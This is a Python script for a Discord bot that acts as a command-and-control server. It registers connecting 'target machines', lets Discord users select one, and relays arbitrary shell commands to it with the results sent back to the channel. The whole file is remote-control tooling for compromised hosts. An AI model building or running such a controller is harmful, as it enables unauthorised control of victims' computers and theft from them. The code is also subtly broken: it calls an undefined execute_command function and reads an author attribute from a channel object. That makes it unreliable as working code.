#!/usr/bin/python3

import discord
import asyncio
import socket
import subprocess
import os
import threading

intents = discord.Intents.all()

TOKEN = "DISCORD TOKEN"
GUILD = "DISCORD SERVER NAME"
SERVER_PORT = 12345

client = discord.Client(intents=intents)

# Dictionary to store client IP addresses and their connection objects
TARGET_MACHINES = {}

USER_TARGETS = {}

@client.event
async def on_ready():
    print(f"{client.user} is connected to the following guild(s):")
    for guild in client.guilds:
        print(f"{guild.name} (id: {guild.id})")

    asyncio.create_task(start_server())

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!list'):
        await list_targets(message.channel)
    elif message.content.startswith('!target '):
        target_number = message.content.split('!target ')[1]
        try:
            target_index = int(target_number) - 1
            target_name = list(TARGET_MACHINES.keys())[target_index]
            user_id = message.author.id
            USER_TARGETS[user_id] = target_name  # Store the user's selected target
            confirmation_message = await target_machine(message.channel, target_name)
            await message.channel.send(confirmation_message)  # Send the confirmation message back to Discord
        except (ValueError, IndexError):
            await message.channel.send("Invalid target number. Use !target <number> to target a machine from the list.")
    elif message.content.startswith('!execute '):
        command = message.content.split('!execute ')[1]
        user_id = message.author.id
        target_name = USER_TARGETS.get(user_id)
        if target_name:
            await send_command(message.channel, target_name, command)
        else:
            await message.channel.send("You haven't targeted any machine yet. Use !target <number> to select a machine first.")


async def target_machine(channel, target_name):
    if target_name in TARGET_MACHINES:
        target_ip, target_port = TARGET_MACHINES[target_name]
        user_id = channel.author.id
        USER_TARGETS[user_id] = target_name  # Store the user's selected target
        return f"Targeting machine '{target_name}' with IP: {target_ip}, Port: {target_port}"
    else:
        return f"Machine '{target_name}' is not in the target list."


async def list_targets(channel):
    if not TARGET_MACHINES:
        await channel.send("No target machines available.")
    else:
        targets_list = "\n".join([f"{index + 1}) {name} ({ip}, {port})" for index, (name, (ip, port)) in enumerate(TARGET_MACHINES.items())])
        await channel.send(f"Available target machines:\n```{targets_list}```")


async def send_command(channel, target_name, command):
    if target_name in TARGET_MACHINES:
        target_ip, target_port = TARGET_MACHINES[target_name]
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((target_ip, target_port))
            client_socket.sendall(command.encode())

            result = client_socket.recv(4096).decode()
            await channel.send(f"Execution result for machine '{target_name}' (IP: {target_ip}, Port: {target_port}):\n```{result}```")
            client_socket.close()
        except Exception as e:
            await channel.send(f"Error executing command on machine '{target_name}' (IP: {target_ip}, Port: {target_port}): {e}")
    else:
        await channel.send(f"Machine '{target_name}' is not in the target list.")


async def start_server():
    server = await asyncio.start_server(handle_client, "", SERVER_PORT)
    print(f"Server listening on port {SERVER_PORT}")

    try:
        async with server:
            await server.serve_forever()
    except Exception as e:
        print(f"Error: {e}")

async def handle_client(reader, writer):
    client_ip, _ = writer.get_extra_info('peername')
    print(f"New connection from {client_ip}")

    try:
        data = await reader.read(4096)
        if not data:
            return

        # Assuming the data received is the client's assigned port as a string
        target_port = int(data.decode())

        # Add the client to the target machines dictionary
        target_name = f"client_{client_ip}_{target_port}"
        TARGET_MACHINES[target_name] = (client_ip, target_port)

        # Send an initial greeting message to the client
        writer.write("Connection established.".encode())
        await writer.drain()

        while True:
            data = await reader.read(4096)
            if not data:
                break

            command = data.decode().strip()
            print(f"Received command '{command}' from the client '{target_name}'")

            if command.lower() == "exit":
                break

            result = execute_command(command)

            # Send the result back to the client
            writer.write(result.encode())
            await writer.drain()

    except Exception as e:
        print(f"Error with client {client_ip}: {e}")
    finally:
        writer.close()

    # Remove the client from the target machines dictionary upon disconnection
    if target_name in TARGET_MACHINES:
        del TARGET_MACHINES[target_name]


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(client.start(TOKEN))
    #loop.create_task(start_server())

    try:
        loop.run_forever()
    except KeyboardInterrupt:
        loop.run_until_complete(client.close())
    finally:
        loop.close()
